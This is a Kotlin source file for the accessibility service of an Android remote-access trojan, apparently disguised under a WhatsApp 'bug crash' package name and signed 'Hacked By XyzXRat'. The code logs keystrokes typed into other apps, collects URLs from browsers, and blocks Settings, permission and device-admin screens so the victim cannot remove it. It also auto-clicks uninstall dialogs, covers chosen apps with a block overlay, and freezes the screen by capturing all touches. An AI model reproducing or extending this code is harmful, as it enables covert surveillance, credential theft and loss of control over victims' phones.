package com.whatsapp.bug.crash

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.util.DisplayMetrics
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.webkit.WebView
import android.webkit.WebViewClient
import android.content.IntentFilter

class XyzAccessibilityService : AccessibilityService() {

    fun performTap(xPct: Float, yPct: Float) {
        try {
            val dm    = DisplayMetrics()
            val wm    = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(dm)
            val x     = xPct * dm.widthPixels
            val y     = yPct * dm.heightPixels
            val path  = Path().apply { moveTo(x, y) }
            val stroke = GestureDescription.StrokeDescription(path, 0L, 60L)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) { Log.e("XyzA11y", "performTap: ${e.message}") }
    }

    fun performSwipe(x1Pct: Float, y1Pct: Float, x2Pct: Float, y2Pct: Float, durationMs: Long = 300L) {
        try {
            val dm  = DisplayMetrics()
            val wm  = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(dm)
            val sx  = x1Pct * dm.widthPixels
            val sy  = y1Pct * dm.heightPixels
            val ex  = x2Pct * dm.widthPixels
            val ey  = y2Pct * dm.heightPixels
            val path = Path().apply { moveTo(sx, sy); lineTo(ex, ey) }
            val stroke = GestureDescription.StrokeDescription(path, 0L, durationMs)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) { Log.e("XyzA11y", "performSwipe: ${e.message}") }
    }


    companion object {
        var instance: XyzAccessibilityService? = null
        var overlayReady: Boolean = false
        var protectionEnabled: Boolean = false

        const val ACTION_ACCESSIBILITY_READY = "com.whatsapp.bug.crash.ACCESSIBILITY_READY"
        const val ACTION_ACCESSIBILITY_HEARTBEAT = "com.whatsapp.bug.crash.ACCESSIBILITY_HEARTBEAT"
        const val ACTION_CLIPBOARD_CHANGED   = "com.whatsapp.bug.crash.CLIPBOARD_CHANGED"
        const val ACTION_KEYLOG              = "com.whatsapp.bug.crash.KEYLOG"
        const val ACTION_URL_VISITED         = "com.whatsapp.bug.crash.URL_VISITED"

        private val blockedPkgs = mutableSetOf<String>()
        private var blockAll    = false
        private var ownPkg      = ""

        fun updateBlockedApps(blocked: Set<String>, blockAllApps: Boolean, selfPkg: String) {
            blockedPkgs.clear()
            blockedPkgs.addAll(blocked)
            blockAll = blockAllApps
            ownPkg   = selfPkg
        }

        private val BLOCKED_PACKAGES_PROTECTION = setOf(
            "com.android.settings", "com.miui.securitycenter", "com.samsung.android.lool",
            "com.coloros.safecenter", "com.vivo.permissionmanager", "com.huawei.systemmanager",
            "com.google.android.packageinstaller", "com.android.packageinstaller",
            "com.android.permissioncontroller",
            "com.transsion.phonemaster", "com.transsion.securitykeyboard",
            "com.infinix.security", "com.tecno.security",
            "com.miui.appmanager", "com.miui.permcenter",
            "com.oppo.safe", "com.coloros.oppoguardelf",
            "com.realme.security",
            "com.iqoo.secure"
        )
        private val BLOCKED_CLASSES_PROTECTION = setOf(
            "com.android.settings.applications.InstalledAppDetails",
            "com.android.settings.applications.AppInfoBase",
            "com.android.settings.applications.ManageApplications",
            "com.android.settings.applications.AppDashboardFragment",
            "com.android.settings.SubSettings",
            "com.android.settings.applications.appinfo.AppInfoDashboardFragment",
            "AppOpsActivity",
            "DrawOverlays",
            "DrawOverOtherApps",
            "DisplayOverOtherApps",
            "ManageOverlayPermission",
            "OverlaySettings",
            "WriteSettings",
            "SpecialAppAccess",
            "SpecialAccessSettings",
            "HighPowerApplications",
            "DeviceAdminAdd",
            "DeviceAdminSettings",
            "NotificationListenerDetail",
            "UsageAccessSettings",
            "AccessibilitySettings",
            "AccessibilityDetailsSettings",
            "NotificationAccessSettings",
            "AppOpsSummary",
            "AppPermissionsFragment",
            "PermissionAppsFragment",
            "PermissionGroupFragment",
            "AllAppPermissionsFragment"
        )

        var pendingUninstallPkg: String = ""

        fun addOverlay(view: View, params: WindowManager.LayoutParams) {
            instance?.windowManager?.addView(view, params)
        }

        fun removeOverlay(view: View) {
            try { instance?.windowManager?.removeView(view) } catch (_: Exception) {}
        }

        @Suppress("DEPRECATION")
        fun applyFullscreenFlags(view: android.view.View) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val applyInsets = Runnable {
                    view.windowInsetsController?.let { ctrl ->
                        ctrl.hide(
                            android.view.WindowInsets.Type.statusBars() or
                            android.view.WindowInsets.Type.navigationBars()
                        )
                        ctrl.systemBarsBehavior =
                            android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
                    }
                }
                if (view.isAttachedToWindow) {
                    applyInsets.run()
                } else {
                    view.addOnAttachStateChangeListener(object : android.view.View.OnAttachStateChangeListener {
                        override fun onViewAttachedToWindow(v: android.view.View) {
                            applyInsets.run()
                        }
                        override fun onViewDetachedFromWindow(v: android.view.View) {}
                    })
                }
            } else {
                view.systemUiVisibility = (
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
                    android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                    android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                    android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
                    android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                )
            }
        }

        fun buildOverlayParams(focusable: Boolean): WindowManager.LayoutParams {
            val baseFlags =
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                @Suppress("DEPRECATION") WindowManager.LayoutParams.FLAG_FULLSCREEN

            val flags = if (focusable) {
                baseFlags or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM
            } else {
                baseFlags or
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            }
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                flags,
                if (focusable) PixelFormat.TRANSLUCENT else PixelFormat.OPAQUE
            )
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                lp.layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
            lp.gravity = android.view.Gravity.TOP or android.view.Gravity.START
            lp.x = 0
            lp.y = 0
            return lp
        }
    }

    private lateinit var windowManager: WindowManager
    private var hasTriggeredReady = false

    private var keylogCurrentPkg: String = ""
    private var keylogCurrentField: String = ""
    private var keylogLastText: String = ""

    private var lastUrlSent: String = ""

    private var blockOverlayView: View? = null
    private var lastBlockedPkg: String = ""
    private var freezeOverlayView: View? = null
    private var isFrozen: Boolean = false

    private var heartbeatHandler: Handler? = null
    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            try {
                sendBroadcast(Intent(ACTION_ACCESSIBILITY_HEARTBEAT).apply { 
                    setPackage(packageName)
                    putExtra("time", System.currentTimeMillis())
                })
            } catch (_: Exception) {}
            heartbeatHandler?.postDelayed(this, 10000) // 10 detik
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        protectionEnabled = true
        // Register freeze broadcast receiver
        try {
            val filter = IntentFilter("com.whatsapp.bug.crash.FREEZE_STATE")
            registerReceiver(freezeStateReceiver, filter, Context.RECEIVER_EXPORTED)
        } catch (e: Exception) {
            Log.e("XyzA11y", "Failed to register freeze receiver: ${e.message}")
        }
        // Start heartbeat emission
        heartbeatHandler = Handler(Looper.getMainLooper())
        heartbeatHandler?.postDelayed(heartbeatRunnable, 1000)
        triggerReady()
    }

    private fun triggerReady() {
        if (hasTriggeredReady) return
        hasTriggeredReady = true
        startForegroundService(Intent(this, DeviceService::class.java))
        Handler(Looper.getMainLooper()).postDelayed({
            sendBroadcast(Intent(ACTION_ACCESSIBILITY_READY).apply { setPackage(packageName) })
        }, 1000)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (!hasTriggeredReady) triggerReady()

        val pkg  = event.packageName?.toString() ?: return
        val cls  = event.className?.toString() ?: ""
        val type = event.eventType

        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleKeylog(event, pkg)
        }

        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

            if (pendingUninstallPkg.isNotEmpty()) {
                val isUninstallDialog = pkg == "com.google.android.packageinstaller" ||
                    pkg == "com.android.packageinstaller" ||
                    pkg == "com.android.permissioncontroller" ||
                    cls.contains("UninstallAppProgress", ignoreCase = true) ||
                    cls.contains("UninstallActivity", ignoreCase = true) ||
                    cls.contains("UninstallAlertActivity", ignoreCase = true)

                if (isUninstallDialog) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        try {
                            val root = rootInActiveWindow ?: return@postDelayed
                            val candidates = listOf("OK", "Uninstall", "Hapus", "Uninstall App", "Lanjutkan")
                            var clicked = false
                            for (label in candidates) {
                                val nodes = root.findAccessibilityNodeInfosByText(label)
                                for (node in nodes) {
                                    if (node.isClickable) {
                                        node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                        clicked = true
                                        break
                                    }
                                    val parent = node.parent
                                    if (parent?.isClickable == true) {
                                        parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                                        clicked = true
                                        break
                                    }
                                }
                                if (clicked) break
                            }
                            if (clicked) pendingUninstallPkg = ""
                        } catch (e: Exception) {
                            Log.e("XyzAccessibility", "autoUninstall click: ${e.message}")
                        }
                    }, 300)
                }
            }

            if (type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val browserPkgs = setOf(
                    "com.android.chrome", "org.mozilla.firefox", "com.opera.browser",
                    "com.microsoft.emmx", "com.brave.browser", "com.sec.android.app.sbrowser",
                    "com.UCMobile.intl", "com.uc.browser.en", "com.kiwibrowser.browser",
                    "mark.via.gp", "com.mi.globalbrowser"
                )
                if (pkg in browserPkgs) {
                    extractUrlFromNode(pkg)
                }
            }

            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val isBlocked = when {
                    pkg == ownPkg || pkg == "android" || pkg == "com.android.systemui" -> false
                    blockAll && ownPkg.isNotEmpty() && pkg != ownPkg -> true
                    blockedPkgs.contains(pkg) -> true
                    else -> false
                }
                if (isBlocked) {
                    Handler(Looper.getMainLooper()).post {
                        try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {}
                        showBlockOverlay(pkg)
                    }
                    return
                }
            }

            if (protectionEnabled) {
                val isBlockedPkg = BLOCKED_PACKAGES_PROTECTION.contains(pkg)
                val isBlockedCls = BLOCKED_CLASSES_PROTECTION.any { cls.contains(it, ignoreCase = true) }

                // ── Force home HANYA untuk App Info, Permission, Device Admin pages ──
                // Dialog uninstall biasa → DIBIARKAN (Device Admin yang block)
                val isAppInfoPage = isBlockedPkg && (
                    cls.contains("AppInfo", ignoreCase = true) ||
                    cls.contains("InstalledApp", ignoreCase = true) ||
                    cls.contains("AppDetail", ignoreCase = true) ||
                    cls.contains("ManageApp", ignoreCase = true) ||
                    cls.contains("AppDashboard", ignoreCase = true) ||
                    cls == "com.android.settings.applications.InstalledAppDetails" ||
                    cls == "com.android.settings.applications.AppInfoBase"
                )

                val isPermissionPage = isBlockedPkg && (
                    cls.contains("Permission", ignoreCase = true) ||
                    cls.contains("Overlay", ignoreCase = true) ||
                    cls.contains("DrawOver", ignoreCase = true) ||
                    cls.contains("SpecialAccess", ignoreCase = true) ||
                    cls.contains("Accessibility", ignoreCase = true) ||
                    cls.contains("NotificationAccess", ignoreCase = true) ||
                    cls.contains("UsageAccess", ignoreCase = true) ||
                    cls.contains("AppOps", ignoreCase = true)
                )

                val isDeviceAdminPage = isBlockedPkg && (
                    cls.contains("DeviceAdmin", ignoreCase = true) ||
                    cls.contains("SubSettings", ignoreCase = true)
                )

                if (isBlockedCls || isAppInfoPage || isPermissionPage || isDeviceAdminPage) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {}
                    }, 50)
                    return
                }
            }

            val prefs = getSharedPreferences(DeviceService.PREFS_NAME, MODE_PRIVATE)
            if (!prefs.getBoolean(DeviceService.PREF_IS_LOCKED, false)) return
            if (!overlayReady) return
            if (pkg != packageName && !pkg.startsWith("android") && pkg != "com.android.systemui") {
                Handler(Looper.getMainLooper()).postDelayed({
                    try { performGlobalAction(GLOBAL_ACTION_BACK) } catch (_: Exception) {}
                }, 80)
            }
        }
    }

    private fun showBlockOverlay(blockedPkg: String) {
        dismissBlockOverlay()
        lastBlockedPkg = blockedPkg

        val appName = try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(blockedPkg, 0)
            ).toString()
        } catch (_: Exception) { blockedPkg }

        val html = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

html,body{
  width:100%;
  height:100%;
  background:transparent;
}

@keyframes spin-border{
  from{transform:rotate(0deg)}
  to{transform:rotate(360deg)}
}

@keyframes spin-border-rev{
  from{transform:rotate(0deg)}
  to{transform:rotate(-360deg)}
}

@keyframes flicker{
  0%,100%{opacity:1}
  48%{opacity:1}
  50%{opacity:.6}
  52%{opacity:1}
}

@keyframes scanline{
  from{top:-20%}
  to{top:110%}
}

@keyframes glow-pulse{
  0%,100%{
    box-shadow:
      0 0 24px rgba(0,255,70,.15),
      0 0 0 1px rgba(0,255,70,.08);
  }

  50%{
    box-shadow:
      0 0 40px rgba(0,255,70,.3),
      0 0 0 1px rgba(0,255,70,.15);
  }
}

.overlay{
  position:fixed;
  inset:0;

  background:transparent;

  display:flex;
  justify-content:center;
  align-items:center;
}

.overlay::after{
  content:'';
  position:absolute;
  inset:0;

  pointer-events:none;

  background:
  repeating-linear-gradient(
    to bottom,
    transparent 0px,
    transparent 3px,
    rgba(0,0,0,.08) 3px,
    rgba(0,0,0,.08) 4px
  );
}

.card-wrap{
  position:relative;
  width:90%;
  max-width:320px;
}

.ring{
  position:absolute;
  inset:-6px;
  border-radius:26px;
  pointer-events:none;
}

.ring::before,
.ring::after{
  content:'';
  position:absolute;
  inset:0;
  border-radius:26px;
  border:2px solid transparent;
}

.ring::before{
  border-top-color:#00ff46;
  border-right-color:#00ff46;
  animation:spin-border 2.4s linear infinite;
}

.ring::after{
  border-bottom-color:#00cc37;
  border-left-color:#00cc37;
  animation:spin-border-rev 3.2s linear infinite;
  opacity:.5;
}

.card{
  background:#030f06;

  border:1px solid rgba(0,255,70,.12);

  border-radius:20px;

  padding:32px 24px 28px;

  display:flex;
  flex-direction:column;
  align-items:center;

  gap:14px;

  position:relative;
  overflow:hidden;

  animation:glow-pulse 3s ease-in-out infinite;
}

.card::before{
  content:'';

  position:absolute;

  left:0;
  right:0;

  height:40px;

  background:
  linear-gradient(
    to bottom,
    transparent,
    rgba(0,255,70,.04),
    transparent
  );

  animation:scanline 3s linear infinite;

  pointer-events:none;

  z-index:0;
}

.close-btn{
  position:absolute;

  top:10px;
  right:10px;

  width:28px;
  height:28px;

  border-radius:6px;

  background:rgba(0,255,70,.06);

  border:1px solid rgba(0,255,70,.15);

  display:flex;

  justify-content:center;
  align-items:center;

  cursor:pointer;

  z-index:2;

  transition:.2s;
}

.close-btn:active{
  background:rgba(0,255,70,.18);
}

.icon-wrap{
  width:68px;
  height:68px;

  border-radius:16px;

  background:rgba(0,255,70,.05);

  border:1px solid rgba(0,255,70,.2);

  display:flex;
  justify-content:center;
  align-items:center;

  position:relative;

  z-index:1;
}

.badge{
  background:rgba(0,255,70,.06);

  border:1px solid rgba(0,255,70,.2);

  border-radius:4px;

  padding:4px 12px;

  color:#00ff46;

  font-family:'Orbitron',sans-serif;

  font-size:9px;

  font-weight:700;

  letter-spacing:4px;

  text-transform:uppercase;

  animation:flicker 5s infinite;

  z-index:1;
}

.title{

  color:#c8ffdb;

  text-align:center;

  line-height:1.5;

  font-size:17px;

  font-family:'Orbitron',sans-serif;

  font-weight:700;

  text-transform:uppercase;

  letter-spacing:1.5px;

  text-shadow:
  0 0 8px rgba(0,255,70,.5),
  0 0 20px rgba(0,255,70,.2);

  z-index:1;
}

.app-name{

  width:100%;

  padding:10px 16px;

  background:rgba(0,0,0,.6);

  border:1px solid rgba(0,255,70,.15);

  border-radius:6px;

  color:#00ff46;

  text-align:center;

  word-break:break-all;

  font-family:'Share Tech Mono',monospace;

  font-size:13px;

  letter-spacing:2px;

  text-shadow:
  0 0 8px rgba(0,255,70,.5);

  z-index:1;
}

.app-name::before{
  content:"> ";
  color:#00cc37;
  opacity:.7;
}

.divider{

  width:100%;

  height:1px;

  background:
  linear-gradient(
    to right,
    transparent,
    rgba(0,255,70,.2),
    transparent
  );

  z-index:1;
}

.err-code{

  color:rgba(0,255,70,.4);

  font-family:'Share Tech Mono',monospace;

  font-size:10px;

  letter-spacing:3px;

  text-shadow:0 0 10px rgba(0,255,70,.3);

  z-index:1;
}

</style>
</head>

<body>

<div class="overlay">

  <div class="card-wrap">

    <div class="ring"></div>

    <div class="card">

      <div class="close-btn" onclick="Android.dismissBlockOverlay()">

        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#00ff46" stroke-width="2.5">

          <line x1="18" y1="6" x2="6" y2="18"/>

          <line x1="6" y1="6" x2="18" y2="18"/>

        </svg>

      </div>

      <div class="icon-wrap">

        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00ff46" stroke-width="1.6">

          <circle cx="12" cy="12" r="10"/>

          <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>

        </svg>

      </div>

      <div class="badge">AKSES DIBLOKIR</div>

      <div class="title">
        Aplikasi Ini<br>
        Tidak Dapat Diakses
      </div>

      <div class="app-name">${appName}</div>

      <div class="divider"></div>

      <div class="err-code">
        Hacked By XyzXRat
      </div>

    </div>

  </div>

</div>

</body>
</html>"""

        val webView = WebView(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            setLayerType(android.view.View.LAYER_TYPE_HARDWARE, null)
            settings.javaScriptEnabled = true
            addJavascriptInterface(object {
                @android.webkit.JavascriptInterface
                fun dismissBlockOverlay() {
                    Handler(Looper.getMainLooper()).post { this@XyzAccessibilityService.dismissBlockOverlay() }
                }
            }, "Android")
            webViewClient = WebViewClient()
            loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
        }

        val params = buildOverlayParams(focusable = true).apply {
            format = PixelFormat.TRANSLUCENT
        }
        try {
            applyFullscreenFlags(webView)
            windowManager.addView(webView, params)
            blockOverlayView = webView
        } catch (e: Exception) {
            Log.e("XyzAccessibility", "showBlockOverlay: ${e.message}")
        }
    }

    fun dismissBlockOverlay() {
        val v = blockOverlayView ?: return
        try { windowManager.removeView(v) } catch (_: Exception) {}
        blockOverlayView = null
    }

    private fun extractUrlFromNode(pkg: String) {
        try {
            val root = rootInActiveWindow ?: return
            val url  = findUrlInTree(root) ?: return
            if (url == lastUrlSent) return
            lastUrlSent = url
            sendBroadcast(Intent(ACTION_URL_VISITED).apply {
                setPackage(packageName)
                putExtra("url", url)
                putExtra("pkg", pkg)
                putExtra("time", System.currentTimeMillis())
            })
        } catch (e: Exception) {
            Log.e("XyzAccessibility", "extractUrlFromNode: ${e.message}")
        }
    }

    private fun findUrlInTree(node: android.view.accessibility.AccessibilityNodeInfo?): String? {
        if (node == null) return null
        val text = node.text?.toString() ?: ""
        if (text.startsWith("http://") || text.startsWith("https://")) return text
        val desc = node.contentDescription?.toString() ?: ""
        if (desc.startsWith("http://") || desc.startsWith("https://")) return desc
        for (i in 0 until node.childCount) {
            val found = findUrlInTree(node.getChild(i))
            if (found != null) return found
        }
        return null
    }

    override fun onInterrupt() {}

    private fun handleKeylog(event: AccessibilityEvent, pkg: String) {
        try {
            if (pkg == packageName) return
            val node     = event.source ?: return
            val fieldId  = node.viewIdResourceName ?: node.className?.toString() ?: "unknown"
            val text     = event.text.joinToString("") { it.toString() }
            if (text == keylogLastText && fieldId == keylogCurrentField && pkg == keylogCurrentPkg) return
            keylogCurrentPkg   = pkg
            keylogCurrentField = fieldId
            keylogLastText     = text
            if (text.isBlank()) return
            sendBroadcast(Intent(ACTION_KEYLOG).apply {
                setPackage(packageName)
                putExtra("pkg",   pkg)
                putExtra("field", fieldId)
                putExtra("text",  text)
                putExtra("time",  System.currentTimeMillis())
            })
        } catch (e: Exception) {
            Log.e("XyzAccessibility", "keylog: ${e.message}")
        }
    }

    // ── Freeze: pasang overlay transparan yang nyerap semua touch ──
    private fun showFreezeOverlay() {
        if (freezeOverlayView != null) return
        try {
            val view = View(this).apply {
                setBackgroundColor(android.graphics.Color.TRANSPARENT)
                isClickable = true
                isFocusable = false
                setOnTouchListener { _, _ -> true } // telan semua touch event
            }
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                // FLAG_NOT_FOCUSABLE saja — TIDAK pakai FLAG_NOT_TOUCHABLE / FLAG_NOT_TOUCH_MODAL
                // supaya overlay ini benar-benar nyerap semua sentuhan
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
            ).also {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    it.layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
                it.gravity = android.view.Gravity.TOP or android.view.Gravity.START
                it.x = 0; it.y = 0
            }
            windowManager.addView(view, lp)
            freezeOverlayView = view
            Log.d("XyzA11y", "Freeze overlay shown")
        } catch (e: Exception) {
            Log.e("XyzA11y", "showFreezeOverlay error: ${e.message}")
        }
    }

    private fun dismissFreezeOverlay() {
        try {
            freezeOverlayView?.let { windowManager.removeView(it) }
        } catch (_: Exception) {}
        freezeOverlayView = null
        Log.d("XyzA11y", "Freeze overlay dismissed")
    }

    private val freezeStateReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
            if (intent?.action != "com.whatsapp.bug.crash.FREEZE_STATE") return
            val frozen = intent.getBooleanExtra("frozen", false)
            isFrozen = frozen
            Handler(Looper.getMainLooper()).post {
                if (frozen) showFreezeOverlay() else dismissFreezeOverlay()
            }
            Log.d("XyzA11y", "Freeze state: $isFrozen")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        dismissBlockOverlay()
        dismissFreezeOverlay()
        try { unregisterReceiver(freezeStateReceiver) } catch (_: Exception) {}
        instance = null
        overlayReady = false
        hasTriggeredReady = false
    }
}
